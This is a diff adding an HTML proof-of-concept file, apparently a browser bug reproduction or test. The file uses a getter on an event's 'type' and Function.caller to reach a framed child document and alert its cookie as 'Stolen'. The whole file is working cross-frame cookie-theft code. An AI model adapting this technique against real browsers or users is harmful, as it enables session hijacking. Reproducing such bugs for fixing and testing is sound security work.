@@ -1,0 +1,39 @@
+<html>
+  <body>
+
+    <iframe src="http://localhost:5001/REPO/child.html"
+      width="300px" height="300px"></iframe>
+
+    <script>
+
+      var ev = new CustomEvent('click');
+      var _type = ev.type;
+      var childDoc;
+      var haveGot = false;
+      var t;
+
+      // Setup the event to re-call the event handler
+      Object.defineProperty(ev, 'type', {
+        get: function getType() {
+          // Make sure we don't loop forever
+          if (!haveGot) {
+            haveGot = true;
+            // Directly get the return value
+            var tmp = getType.caller({ type: 'click' })
+            childDoc = tmp.parentNode.parentNode.parentNode;
+            alert("Stolen: " + childDoc.cookie)
+          }
+          return _type;
+        }
+      });
+
+      // Let the child document load
+      setTimeout(function () {
+        // Dispatch the prepared event on the iframe window
+        var iframe = document.getElementsByTagName('iframe')[0];
+        window.dispatchEvent.call(iframe.contentWindow, ev);
+      }, 1000);
+
+    </script>
+  </body>
+</html>
